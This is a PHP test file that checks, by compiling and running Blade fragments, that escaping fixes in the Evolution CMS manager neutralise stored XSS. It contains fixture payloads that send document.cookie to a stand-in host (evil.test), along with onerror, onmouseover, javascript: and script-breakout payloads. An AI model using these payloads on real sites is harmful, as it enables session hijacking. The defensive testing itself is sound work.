<?php

use EvolutionCMS\Models\EventLog;
use Illuminate\Filesystem\Filesystem;
use Illuminate\Support\HtmlString;
use Illuminate\View\Compilers\BladeCompiler;

/*
|--------------------------------------------------------------------------
| End to end proof: `{!! !!}` vs the replacements
|--------------------------------------------------------------------------
|
| These tests compile and execute real Blade fragments, so the escaping behaviour is observed
| rather than assumed. The fragments are written here from independent sample data; nothing is
| read out of the shipped templates.
|
*/

/**
 * Compile a Blade fragment and execute it, returning the produced HTML.
 */
function renderBladeFragment(string $template, array $data = []): string
{
    static $compiler = null;

    if ($compiler === null) {
        $cache = sys_get_temp_dir() . '/evo-blade-security-tests';
        if (!is_dir($cache)) {
            mkdir($cache, 0777, true);
        }
        $compiler = new BladeCompiler(new Filesystem(), $cache);
    }

    $compiled = $compiler->compileString($template);

    extract($data, EXTR_SKIP);

    ob_start();
    try {
        eval('?>' . $compiled);
    } catch (\Throwable $exception) {
        ob_end_clean();
        throw $exception;
    }

    return ob_get_clean();
}

/**
 * A stored payload of the kind that reaches the Event Log: an unauthenticated visitor can make
 * the CMS log a failing request, and the logged message ends up in the manager.
 */
function storedXssPayload(): string
{
    return 'Import failed<br /><pre>bad value: <script>fetch("//evil.test/"+document.cookie)</script></pre>';
}

test('the old raw echo really did execute a stored payload', function () {
    // This is the behaviour the change removes. Keeping it as a test documents the bug and fails
    // loudly if `{!! !!}` is ever reintroduced for this value.
    $output = renderBladeFragment('{!! $description !!}', ['description' => storedXssPayload()]);

    expect($output)->toContain('<script>')
        ->and($output)->toContain('fetch("//evil.test/"+document.cookie)');
});

test('printing the sanitised description keeps the layout and disarms the payload', function () {
    $log = (new EventLog())->setRawAttributes([
        'type' => EventLog::TYPE_ERROR,
        'description' => storedXssPayload(),
    ], true);

    $output = renderBladeFragment('{{ $log->descriptionHtml() }}', ['log' => $log]);

    // No executable element and no handler reaches the browser.
    expect($output)->not->toContain('<script')
        ->and($output)->not->toContain('</script>')
        ->and($output)->not->toContain('evil.test');

    // The message is still readable and the formatting the CMS wrote is still formatting.
    expect($output)->toContain('Import failed')
        ->and($output)->toContain('<br>')
        ->and($output)->toContain('<pre>')
        ->and($output)->toContain('bad value:');
});

test('the error report ExceptionHandler stores still renders as a report', function () {
    // ExceptionHandler writes a whole HTML document into the description: styled headings,
    // MakeTable grids and formatted <pre> blocks. Escaping it would show the operator raw
    // source code instead of the report, so the presentation attributes have to survive.
    $report = '<h2 style="color:red">&laquo; Evolution CMS Parse Error &raquo;</h2>'
        . '<table class="grid"><thead><tr class=""><th width="100px">Error information</th><th></th></tr></thead>'
        . '<tr class="gridItem"><td>File</td><td>/core/src/Thing.php</td></tr></table><br />'
        . '<pre style="font-weight:bold;border:1px solid #ccc;background-color:#ffffcd;">SQL &gt; SELECT 1</pre>'
        . '<td><strong>Handler-&gt;handleShutdown</strong>()</td>';

    $log = (new EventLog())->setRawAttributes([
        'type' => EventLog::TYPE_ERROR,
        'description' => $report,
    ], true);

    $output = renderBladeFragment('{{ $log->descriptionHtml() }}', ['log' => $log]);

    // Structure and presentation are intact.
    expect($output)->toContain('<h2 style="color:red">')
        ->and($output)->toContain('<table class="grid">')
        ->and($output)->toContain('width="100px"')
        ->and($output)->toContain('<tr class="gridItem">')
        ->and($output)->toContain('<strong>')
        ->and($output)->toContain('background-color:#ffffcd');

    // Not a single tag is shown as literal text.
    expect($output)->not->toContain('&lt;table')
        ->and($output)->not->toContain('&lt;h2')
        ->and($output)->not->toContain('&lt;pre');

    // Entities that were already encoded are not encoded a second time.
    expect($output)->toContain('SQL &gt; SELECT 1')
        ->and($output)->not->toContain('&amp;gt;');
});

test('a payload hidden inside a stored error report is stripped, the report is not', function () {
    $report = '<table class="grid" onmouseover="alert(1)"><tr><td>File</td>'
        . '<td>/tmp/<img src=x onerror="fetch('//evil.test/'+document.cookie)">.php</td></tr></table>'
        . '<a href="javascript:alert(1)">details</a>';

    $log = (new EventLog())->setRawAttributes([
        'type' => EventLog::TYPE_ERROR,
        'description' => $report,
    ], true);

    $output = renderBladeFragment('{{ $log->descriptionHtml() }}', ['log' => $log]);

    expect($output)->not->toMatch('~\son[a-z]+\s*=~i')
        ->and($output)->not->toContain('javascript:')
        ->and($output)->not->toContain('evil.test')
        ->and($output)->not->toContain('<img');

    // The surrounding report is untouched, including the link text.
    expect($output)->toContain('<table class="grid">')
        ->and($output)->toContain('<td>File</td>')
        ->and($output)->toContain('details');
});

test('the encoded mail body marker stays invisible after escaping', function () {
    // Successful mail events append the accepted body as a base64 HTML comment. An escaping sink
    // that forgets about it would print the base64 blob as visible text.
    $description = EventLog::appendMailBody('Message accepted', '<p>Hello &amp; welcome</p>');

    $log = (new EventLog())->setRawAttributes([
        'type' => EventLog::TYPE_MAIL_SENT,
        'description' => $description,
    ], true);

    $output = renderBladeFragment('{{ $log->descriptionHtml() }}', ['log' => $log]);

    expect(trim($output))->toBe('Message accepted')
        ->and($output)->not->toContain('EvolutionCMS mail body')
        ->and($output)->not->toContain(base64_encode('<p>Hello &amp; welcome</p>'));

    // The body itself is still recoverable for the sandboxed preview iframe.
    expect($log->mailBody())->toBe('<p>Hello &amp; welcome</p>');
});

test('a stored element description can no longer script the element list', function () {
    // What an operator with element rights could previously store, seen by every other manager.
    $description = 'Renders the footer <b>fast</b><img src=x onerror="alert(document.domain)">';

    $output = renderBladeFragment('<td>{{ safe_html($item->description) }}</td>', [
        'item' => (object) ['description' => $description],
    ]);

    // The payload text is still readable, but it is content now: no element, no attribute.
    expect($output)->not->toContain('<img')
        ->and($output)->not->toMatch('~<[a-zA-Z][^>]*\s[^>]*>~')
        ->and($output)->toContain('<b>fast</b>')
        ->and($output)->toContain('Renders the footer');
});

test('a stored module icon can no longer break out of the class attribute', function () {
    // The icon is a CSS class list, so it belongs in `{{ }}` - it is never markup.
    $icon = 'fa fa-cube" onmouseover="alert(1)';

    $output = renderBladeFragment('<i class="{{ $icon }}"></i>', ['icon' => $icon]);

    expect($output)->toBe('<i class="fa fa-cube&quot; onmouseover=&quot;alert(1)"></i>')
        ->and($output)->not->toContain('onmouseover="alert(1)"');
});

test('a stored username cannot script the manager page title', function () {
    $output = renderBladeFragment('<title>{{ $managerTitle }}</title>', [
        'managerTitle' => '</title><script>alert(1)</script> - (Evolution CMS Manager)',
    ]);

    expect($output)->not->toContain('<script>')
        ->and($output)->not->toContain('</title><');
});

test('Blade leaves Htmlable untouched, so a producer decides once what is safe', function () {
    // The whole approach rests on this contract: `{{ }}` escapes strings but prints Htmlable
    // verbatim, which is why a trusted producer can return HtmlString instead of the template
    // opting out of escaping with `{!! !!}`.
    $escaped = renderBladeFragment('{{ $value }}', ['value' => '<b>x</b> & y']);
    $passthrough = renderBladeFragment('{{ $value }}', ['value' => new HtmlString('<b>x</b> &amp; y')]);

    expect($escaped)->toBe('&lt;b&gt;x&lt;/b&gt; &amp; y')
        ->and($passthrough)->toBe('<b>x</b> &amp; y');
});

test('@js keeps a payload inside the script element it was written into', function () {
    // A pre-encoded JSON payload used to be printed raw, which lets a stored `</script>` close
    // the element and start a new one.
    $payload = '</script><script>alert(1)</script>';

    $broken = renderBladeFragment('<script>var a = {!! $value !!};</script>', ['value' => $payload]);
    $fixed = renderBladeFragment('<script>var a = @js($value);</script>', ['value' => $payload]);

    expect($broken)->toContain('</script><script>alert(1)')
        ->and(substr_count($broken, '<script>'))->toBe(2);

    expect(substr_count($fixed, '</script>'))->toBe(1)
        ->and(substr_count($fixed, '<script>'))->toBe(1);
});

test('@js does not corrupt the text the way an escaped HTML echo does', function () {
    // The reason `"{{ }}"` is not an option inside a script element: it would store `&#039;` in
    // the JavaScript variable, and the user would read the entity in the confirm dialog.
    $lexicon = "Delete the resource 'Home' & \"Blog\"?";

    $broken = renderBladeFragment('<script>var a = "{{ $value }}";</script>', ['value' => $lexicon]);
    $fixed = renderBladeFragment('<script>var a = @js($value);</script>', ['value' => $lexicon]);

    expect($broken)->toContain('&#039;')
        ->and($broken)->toContain('&amp;');

    expect($fixed)->not->toContain('&#039;')
        ->and($fixed)->not->toContain('&quot;')
        ->and($fixed)->not->toContain('&amp;');
});

test('js_json keeps the payload inside the JSON literal and still decodes to the original', function () {
    // js_json() embeds raw JSON (no JSON.parse wrapper), which is why it has to escape `<` and
    // `>` itself; apostrophes stay literal on purpose.
    $payload = [
        'confirm_delete_resource' => "Delete 'Home'?",
        'evil' => '</script><script>alert(1)</script>',
    ];

    $json = (string) js_json($payload);

    expect($json)->toContain("Delete 'Home'?")
        ->and($json)->not->toContain('</script>')
        ->and($json)->toContain('\u003C/script\u003E');

    // Nothing is lost: a browser decodes it back to exactly the input.
    expect(json_decode($json, true))->toBe($payload);

    // And it is Htmlable, so the template prints it with `{{ }}`.
    expect(e(js_json($payload)))->toBe($json);
});
